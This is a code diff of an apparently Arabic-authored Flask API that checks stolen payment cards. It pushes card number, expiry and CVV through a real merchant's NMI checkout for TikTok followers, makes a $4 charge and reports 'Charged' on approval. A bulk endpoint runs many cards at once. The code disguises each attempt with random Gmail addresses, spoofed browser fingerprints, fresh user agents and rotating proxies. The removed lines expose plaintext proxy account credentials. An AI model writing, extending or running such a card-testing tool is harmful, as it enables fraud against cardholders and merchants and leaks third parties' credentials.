@@ -9,7 +9,6 @@ import json
 import logging
 from datetime import datetime
 from user_agent import generate_user_agent
-user = generate_user_agent()
 
 app = Flask(__name__)
 
@@ -63,16 +62,43 @@ usernames = [
 ]
 
 def generate_gmail():
-    """توليد بريد إلكتروني عشوائي"""
     username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
     return f"{username}@gmail.com"
 
 def get_random_username():
-    """اختيار يوزر عشوائي"""
     return random.choice(usernames)
 
-def process_card_sync(ccx):
-    """معالجة بطاقة واحدة - تعمل بشكل متزامن وترجع النتيجة مباشرة"""
+def parse_proxy(proxy_str):
+    """تحليل البروكسي بأنواعه المختلفة"""
+    if not proxy_str:
+        return None, None
+    
+    proxy_str = proxy_str.strip()
+    
+    # بروكسي HTTP/HTTPS مع username:password@host:port
+    if '@' in proxy_str and '://' in proxy_str:
+        # http://user:pass@host:port
+        if 'http://' in proxy_str or 'https://' in proxy_str:
+            return proxy_str, proxy_str
+        # user:pass@host:port (بدون بروتوكول)
+        else:
+            return f"http://{proxy_str}", f"https://{proxy_str}"
+    
+    # بروكسي SOCKS5
+    if proxy_str.startswith('socks5://'):
+        return proxy_str, proxy_str
+    
+    # بروكسي HTTP/HTTPS بدون username:password
+    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
+        return proxy_str, proxy_str
+    
+    # host:port فقط
+    if ':' in proxy_str and not proxy_str.startswith('http'):
+        return f"http://{proxy_str}", f"https://{proxy_str}"
+    
+    return None, None
+
+def process_card_sync(ccx, proxy_str=None):
     try:
         logger.info(f"Starting processing for card: {ccx[:10]}...")
         
@@ -90,29 +116,26 @@ def process_card_sync(ccx):
             yy = yy.split("20")[1]
         
         # إعداد البروكسي
-
-        proxy_list = [
-    "http://purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780",
-    "http://purevpn0s8732217:i67s60ep@px400501.pointtoserver.com:10780",
-    "http://reseller3270s320237:7Grp9Gki@px121001.pointtoserver.com:10780",
-    "http://reseller3270s320237:7Grp9Gki@px180801.pointtoserver.com:10780",
-    "http://reseller3270s320237:7Grp9Gki@px591201.pointtoserver.com:10780",
-    "http://tickets:proxyon145@173.234.153.90:12345",
-]
-
-        proxy = random.choice(proxy_list)
-
-        proxies = {
-    "http": proxy,
-    "https": proxy,
-}
+        proxies = None
+        if proxy_str:
+            http_proxy, https_proxy = parse_proxy(proxy_str)
+            if http_proxy and https_proxy:
+                proxies = {
+                    "http": http_proxy,
+                    "https": https_proxy,
+                }
+                logger.info(f"Using proxy: {http_proxy}")
+            else:
+                logger.warning(f"Invalid proxy format: {proxy_str}")
         
-        # إنشاء جلسة جديدة لكل طلب
+        # إنشاء جلسة جديدة
         session = requests.Session(
             impersonate="chrome110",
             proxies=proxies,
             timeout=30,
         )
+        
+        user = generate_user_agent()
         
         headers = {
             'User-Agent': user,
@@ -120,7 +143,7 @@ def process_card_sync(ccx):
             'Content-Type': 'application/x-www-form-urlencoded',
         }
         
-        # ====== الخطوة 1: الحصول على الصفحة الأولى ======
+        # ====== الخطوة 1 ======
         logger.info("Getting initial page")
         response = session.get('https://boostme.com/tiktok-followers/tiktok-account-information/100-followers')
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -139,14 +162,13 @@ def process_card_sync(ccx):
             allow_redirects=True
         )
         
-        # استخراج ID
         v2_match = re.search(r'/cart-summary/([a-f0-9-]+)', response.text)
         if not v2_match:
             return {"status": "error", "message": "Failed to get cart ID"}
         cart_id = v2_match.group(1)
         logger.info(f"Cart ID: {cart_id}")
         
-        # ====== الخطوة 2: جلب صفحة Cart Summary ======
+        # ====== الخطوة 2 ======
         logger.info("Getting cart summary")
         response = session.get(f'https://boostme.com/cart-summary/{cart_id}')
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -172,7 +194,7 @@ def process_card_sync(ccx):
         transaction_id = checkout_match.group(1)
         logger.info(f"Transaction ID: {transaction_id}")
         
-        # ====== الخطوة 3: إنشاء Token ======
+        # ====== الخطوة 3 ======
         logger.info("Creating token")
         data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -184,7 +206,7 @@ def process_card_sync(ccx):
         token_id = response.json()['token']
         logger.info(f"Token created: {token_id}")
         
-        # ====== الخطوة 4: إرسال بيانات البطاقة ======
+        # ====== الخطوة 4 ======
         headers_json = {
             'authority': 'secure.nmi.com',
             'accept': '*/*',
@@ -194,7 +216,6 @@ def process_card_sync(ccx):
             'user-agent': user,
         }
         
-        # إرسال رقم البطاقة
         logger.info("Sending card number")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -204,7 +225,6 @@ def process_card_sync(ccx):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
-        # إرسال تاريخ الانتهاء
         logger.info("Sending expiry date")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -214,7 +234,6 @@ def process_card_sync(ccx):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
-        # إرسال CVV
         logger.info("Sending CVV")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -224,7 +243,6 @@ def process_card_sync(ccx):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
-        # Lookup
         logger.info("Looking up token")
         json_data = {
             'tokenId': token_id,
@@ -233,7 +251,7 @@ def process_card_sync(ccx):
         }
         session.post('https://secure.nmi.com/token/api/lookup', json=json_data)
         
-        # ====== الخطوة 5: تنفيذ الدفع ======
+        # ====== الخطوة 5 ======
         logger.info("Executing payment")
         json_data = {'token': token_id}
         response = session.post(
@@ -253,17 +271,16 @@ def process_card_sync(ccx):
         r = result.get('responsetext', '')
         logger.info(f"Response: {r}")
         
-        # تخزين النتيجة
         if 'Approved' in r:
             return {
-                "status": "success", 
-                "message": "Charged - 4$ !", 
+                "status": "success",
+                "message": "Charged - 4$ !",
                 "details": r,
                 "card": f"{n[:4]}****{n[-4:]}"
             }
         else:
             return {
-                "status": "failed", 
+                "status": "failed",
                 "message": r,
                 "card": f"{n[:4]}****{n[-4:]}"
             }
@@ -274,17 +291,15 @@ def process_card_sync(ccx):
 
 @app.route('/charge', methods=['POST'])
 def charge_card():
-    """شحن بطاقة - يعيد النتيجة مباشرة"""
     try:
         data = request.get_json()
         if not data or 'cc' not in data:
             return jsonify({"error": "Missing 'cc' parameter"}), 400
         
         ccx = data['cc']
+        proxy = data.get('proxy', None)  # المستخدم يحط بروكسي هنا
         
-        # معالجة البطاقة مباشرة
-        result = process_card_sync(ccx)
-        
+        result = process_card_sync(ccx, proxy)
         return jsonify(result), 200
         
     except Exception as e:
@@ -293,17 +308,17 @@ def charge_card():
 
 @app.route('/charge/bulk', methods=['POST'])
 def charge_bulk():
-    """شحن عدة بطاقات دفعة واحدة - يعيد النتائج مباشرة"""
     try:
         data = request.get_json()
         if not data or 'cards' not in data or not isinstance(data['cards'], list):
             return jsonify({"error": "Missing 'cards' list parameter"}), 400
         
         cards = data['cards']
-        results = []
+        proxy = data.get('proxy', None)  # بروكسي واحد للجميع أو كل وحدة ببروكسيها
         
+        results = []
         for ccx in cards:
-            result = process_card_sync(ccx)
+            result = process_card_sync(ccx, proxy)
             results.append({
                 "card": ccx[:10] + "...",
                 "result": result
@@ -320,12 +335,11 @@ def charge_bulk():
 
 @app.route('/health', methods=['GET'])
 def health_check():
-    """فحص صحي للخدمة"""
     return jsonify({
         "status": "healthy",
         "timestamp": datetime.now().isoformat()
     })
 
 if __name__ == '__main__':
-    logger.info("Starting Flask API server on port 5000 (Synchronous mode)")
+    logger.info("Starting Flask API server on port 5000")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
